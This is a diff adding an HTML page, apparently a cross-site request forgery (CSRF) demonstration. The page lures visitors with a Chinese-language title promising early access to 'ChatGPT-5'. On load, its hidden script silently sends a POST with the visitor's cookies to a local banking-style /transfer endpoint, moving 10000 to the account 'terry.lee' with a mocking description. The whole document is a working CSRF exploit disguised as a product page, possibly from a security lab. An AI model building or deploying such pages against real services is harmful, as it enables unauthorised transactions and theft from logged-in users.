@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>ChatGPT-5將於2024年發布，搶先申請優先體驗!</title>
+    <script
+      src="https://code.jquery.com/jquery-3.7.1.min.js"
+      integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
+      crossorigin="anonymous"
+    ></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.2/axios.min.js"></script>
+  </head>
+  <body></body>
+
+  <script>
+    const URL = "http://127.0.0.1:9001/transfer";
+    const data = {
+      amount: 10000,
+      account: "terry.lee",
+      description: "你被CSRF攻擊了~ 笨蛋",
+    };
+
+    $.ajax({
+      type: "POST",
+      url: URL,
+      xhrFields: {
+        withCredentials: true, // 攜帶 cookie
+      },
+      crossDomain: true,
+      data: data,
+    });
+  </script>
+</html>
